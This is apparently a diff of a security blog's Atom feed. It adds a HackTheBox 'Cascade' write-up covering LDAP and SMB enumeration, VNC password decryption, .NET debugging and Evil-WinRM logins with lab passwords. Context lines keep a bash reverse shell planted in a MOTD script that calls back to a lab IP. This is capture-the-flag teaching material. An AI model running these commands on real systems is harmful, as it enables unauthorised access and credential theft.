@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://gr0sabi.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://gr0sabi.github.io/" rel="alternate" type="text/html" /><updated>2020-09-06T10:32:07-04:00</updated><id>https://gr0sabi.github.io/feed.xml</id><title type="html">gr0sabi@notes</title><subtitle>An information security blog. Various posts related to the struggle and pursuit of knowing a little about poking at machines.</subtitle><author><name>J.D. Grow</name></author><entry><title type="html">Remote Write-Up: HackTheBox</title><link href="https://gr0sabi.github.io/hackthebox/remote-write-up-hackthebox/" rel="alternate" type="text/html" title="Remote Write-Up: HackTheBox" /><published>2020-09-05T00:00:00-04:00</published><updated>2020-09-05T00:00:00-04:00</updated><id>https://gr0sabi.github.io/hackthebox/remote-write-up-hackthebox</id><content type="html" xml:base="https://gr0sabi.github.io/hackthebox/remote-write-up-hackthebox/">&lt;p&gt;&lt;img src=&quot;\assets\images\htb\remote\banner-remote.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://gr0sabi.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://gr0sabi.github.io/" rel="alternate" type="text/html" /><updated>2020-09-06T10:36:25-04:00</updated><id>https://gr0sabi.github.io/feed.xml</id><title type="html">gr0sabi@notes</title><subtitle>An information security blog. Various posts related to the struggle and pursuit of knowing a little about poking at machines.</subtitle><author><name>J.D. Grow</name></author><entry><title type="html">Remote Write-Up: HackTheBox</title><link href="https://gr0sabi.github.io/hackthebox/remote-write-up-hackthebox/" rel="alternate" type="text/html" title="Remote Write-Up: HackTheBox" /><published>2020-09-05T00:00:00-04:00</published><updated>2020-09-05T00:00:00-04:00</updated><id>https://gr0sabi.github.io/hackthebox/remote-write-up-hackthebox</id><content type="html" xml:base="https://gr0sabi.github.io/hackthebox/remote-write-up-hackthebox/">&lt;p&gt;&lt;img src=&quot;\assets\images\htb\remote\banner-remote.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;
 &lt;p&gt;Remote was a Windows-based, easy level challenge from mrb3n on HackTheBox that had a cool privilege escalation. The initial Nmap scan showed multiple interesting ports - FTP with anonymous login, web server on port 80, SMB on 445 and a open NFS share. I started by connecting to FTP via the anonymous login, but it showed nothing interesting. Next, a quick enumeration of all available data on the http service led to an Umbraco login. I then connected the open NFS share on port 2049 and begun some real enumeration which allowed an extracted Administrator hash to the Umbraco application. Logging into Umbraco, I was able to exploit the application with a known CVE to obtain a shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iss apppool&lt;/code&gt; and capture the User flag. After some system enumeration I discovered TeamViewer ver. 7.0.43148 installed which uses a shared AES key for all customer installations and published under CVE-2019-18988. This allowed a password to be decrypted that just so happened to a reused Administrator user password.&lt;/p&gt;
 
@@ -202,7 +202,124 @@ Ref: &lt;a href=&quot;http://manpages.ubuntu.com/manpages/trusty/man5/update-mot
 &lt;p&gt;Next, I set up a netcat listener on port 9001. I echo’d a Bash Reverse Shell into the 00-header file, and logged in via SSH with Sysadmin to trigger the MOTD execution. And it worked!&lt;/p&gt;
 
 &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo &quot;bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.37/9001 0&amp;gt;&amp;amp;1'&quot; &amp;gt;&amp;gt; /etc/update-motd.d/00-header&lt;/code&gt;
-&lt;img src=&quot;\assets\images\htb\traceback\root-flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>J.D. Grow</name></author><category term="hackthebox" /><category term="hacking" /><category term="penetration testing" /><category term="write-ups" /><category term="linux" /><summary type="html">Traceback was an easy-rated, Linux machine made by Xh4H on HackTheBox that allowed some Lua interaction and unique escalation vector.</summary></entry><entry><title type="html">Book Write-Up: HackTheBox</title><link href="https://gr0sabi.github.io/hackthebox/book-write-up-hack-the-box/" rel="alternate" type="text/html" title="Book Write-Up: HackTheBox" /><published>2020-07-11T00:00:00-04:00</published><updated>2020-07-11T00:00:00-04:00</updated><id>https://gr0sabi.github.io/hackthebox/book-write-up-hack-the-box</id><content type="html" xml:base="https://gr0sabi.github.io/hackthebox/book-write-up-hack-the-box/">&lt;p&gt;&lt;img src=&quot;\assets\images\htb\book\book-banner.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;\assets\images\htb\traceback\root-flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>J.D. Grow</name></author><category term="hackthebox" /><category term="hacking" /><category term="penetration testing" /><category term="write-ups" /><category term="linux" /><summary type="html">Traceback was an easy-rated, Linux machine made by Xh4H on HackTheBox that allowed some Lua interaction and unique escalation vector.</summary></entry><entry><title type="html">Cascade Write-Up: HackTheBox</title><link href="https://gr0sabi.github.io/hackthebox/cascade-write-up-hackthebox/" rel="alternate" type="text/html" title="Cascade Write-Up: HackTheBox" /><published>2020-07-25T00:00:00-04:00</published><updated>2020-07-25T00:00:00-04:00</updated><id>https://gr0sabi.github.io/hackthebox/cascade-write-up-hackthebox</id><content type="html" xml:base="https://gr0sabi.github.io/hackthebox/cascade-write-up-hackthebox/">&lt;p&gt;&lt;img src=&quot;\assets\images\htb\cascade\cascade-banner.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;
+&lt;p&gt;Cascade is a well-made, straight-forward machine that is a fun enumeration exercise and requires a bit of .NET debugging. Port enumeration reveals an open LDAP service that is used to dump user objects. One user (Ryan Thompson) has a custom attribute (cascadeLegacyPwd) that reveals a Base64-encoded password which allows SMB authentication to read a shared folder (Data). Within the shared folder a VNC registry file leaks the encrypted password of another user (s.smith) which (once unecrypted) the user access to read a different SMB share (Audit$). Within the new shared folder, an insecurely written .NET application can be obtained and debugged to decrypt the password of a custom service user (ArkSvc). With the custom service user (ArkSvc), a deleted Active Directory object of a temporary admin account with the same custom attribute (cascadeLegacyPwd) can be obtained. This attribute can be decoded and is an identical (reused) password to the Administrator account.&lt;/p&gt;
+
+&lt;h2 id=&quot;nmap-port-scan&quot;&gt;Nmap Port Scan&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap/cascade-full 10.10.10.182
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-03-31 19:27 EDT
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.182
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.023s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65520 filtered ports
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1DB15D39&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Windows Server 2008 R2 SP1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1DB15D39&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;server &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2020-03-31 23:32:04Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: cascade.local, Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+445/tcp   open  microsoft-ds?
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: cascade.local, Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49165/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: CASC-DC1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 2m49s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2020-03-31T23:32:53
+|_  start_date: 2020-03-31T21:10:59
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;ldap-enumeration&quot;&gt;LDAP Enumeration&lt;/h2&gt;
+
+&lt;p&gt;Enumerating LDAP we see an interesting attribute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cascadeLegacyPwd&lt;/code&gt;. The Base64 value decodes to what appears to be a password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rY4n5eva&lt;/code&gt;. 
+&lt;img src=&quot;\assets\images\htb\cascade\cacade-ryan-user-object.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Commands Utilized:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapsearch &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.10.10.182 &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; base namingcontexts
+ldapsearch &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.10.10.182 &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DC=cascade,DC=local&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ldap-out.txt
+ldapsearch &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.10.10.182 &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DC=cascade,DC=local&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'(objectClass=Person)'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ldap-object-person.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;smb-enumeration&quot;&gt;SMB Enumeration&lt;/h2&gt;
+
+&lt;p&gt;Our new friend Ryan can read some interesting an interesting share called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Data&lt;/code&gt;.
+&lt;img src=&quot;\assets\images\htb\cascade\cacade-ryan-smb1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s see what’s inside.
+&lt;img src=&quot;\assets\images\htb\cascade\cacade-ryan-smb2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This data looks worthwhile. Let’s mount it to get a closer look at these files.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; cifs &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;r.thompson //10.10.10.182/Data /mnt/smb-data/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Three files really stood out to me. The first is the meeting notes, which make a point to let us know about a TempAdmin account that has the same password as the normal admin account.
+&lt;img src=&quot;\assets\images\htb\cascade\meeting-notes-html.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This next file is interesting. It shows the ArkSvc user running an application that shows the deletion the TempAdmin account (mentioned in the above “Meeting Notes”) with object location.
+&lt;img src=&quot;\assets\images\htb\cascade\ark-log.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The last interesting file, VNC Install.reg, in s.smith’s directory, contained the VNC encrypted password:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;...
+&quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Using this tool https://github.com/trinitronx/vncpasswd.py it was successfully decrypted and appears we have another password:
+&lt;img src=&quot;\assets\images\htb\cascade\vcnpass.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Continuing my SMB enumeration, s.smith had access to Read the Audit$ share, so I mounted it to get a good look at the files.
+&lt;img src=&quot;\assets\images\htb\cascade\audit-share-view.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I took a quick glance at the Audit.db file, looks like we have a winner.
+&lt;img src=&quot;\assets\images\htb\cascade\sqlite-db.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;dnspy-to-the-rescue&quot;&gt;dnSpy to the Rescue&lt;/h3&gt;
+&lt;p&gt;Transferred over the files application to a Windows machine, utlizing dnSpy I was able to set a breakpoint in the application to decrypt the password of ArkSvc user: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;w3lc0meFr31nd&lt;/code&gt;
+&lt;img src=&quot;\assets\images\htb\cascade\Cascade-HTB.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;shells&quot;&gt;Shells&lt;/h2&gt;
+
+&lt;h3 id=&quot;user-flag&quot;&gt;User Flag&lt;/h3&gt;
+&lt;p&gt;Satisfied with SMB enumeration of the files, I utilized Evil-WinRM to login with s.smith user and capture the user flag.
+&lt;img src=&quot;\assets\images\htb\cascade\user-flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Repeated the use of Evil-WinRM to login with ArkSvc user.
+&lt;img src=&quot;\assets\images\htb\cascade\arkscv-login.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Viewing Groups it appears that ArkSvc has a unique group.
+&lt;img src=&quot;\assets\images\htb\cascade\arksvc-group.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s check on that deleted TempAdmin account. Yep! Gone, but not forgotten.
+&lt;img src=&quot;\assets\images\htb\cascade\temp-admin-enum.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Viewed the properties and noticed our old friend cascadeLegacyPwd.
+&lt;img src=&quot;\assets\images\htb\cascade\property-dump.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Primary Commands Utilized:&lt;/p&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;Get-ADPrincipalGroupMembership&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Identity&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;arksvc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Get-ADObject&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Identity&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-IncludeDeletedObjects&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Get-ADObject&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Identity&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-IncludeDeletedObjects&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Properties&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h3&gt;
+
+&lt;p&gt;The decoded base64 of the cascadeLegacyPwd is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;baCT3r1aN00dles&lt;/code&gt; and immediately worked with the Administrator account to capture the root flag.
+&lt;img src=&quot;\assets\images\htb\cascade\root-flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>J.D. Grow</name></author><category term="hackthebox" /><category term="hacking" /><category term="penetration testing" /><category term="write-ups" /><summary type="html">Cascade is a well-made, straight-forward machine that is a fun enumeration exercise and requires a bit of .NET debugging.</summary></entry><entry><title type="html">Book Write-Up: HackTheBox</title><link href="https://gr0sabi.github.io/hackthebox/book-write-up-hack-the-box/" rel="alternate" type="text/html" title="Book Write-Up: HackTheBox" /><published>2020-07-11T00:00:00-04:00</published><updated>2020-07-11T00:00:00-04:00</updated><id>https://gr0sabi.github.io/hackthebox/book-write-up-hack-the-box</id><content type="html" xml:base="https://gr0sabi.github.io/hackthebox/book-write-up-hack-the-box/">&lt;p&gt;&lt;img src=&quot;\assets\images\htb\book\book-banner.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;
 &lt;p&gt;Book was a &lt;em&gt;medium&lt;/em&gt; machine on Hack The Box created by MrR3boot. Initial recon revealed a web application whose user registration is vulnerable to a SQL truncation attack, leading to login as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;. Once &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;, we can inject XSS payloads to read local files through dynamically generated PDFs, which is used to extract a user’s private SSH key. Finally, logged in as the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reader&lt;/code&gt; via SSH, a vulnerable version of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;logrotate&lt;/code&gt; running as root is discovered, which is exploited to escalate to root.&lt;/p&gt;
 
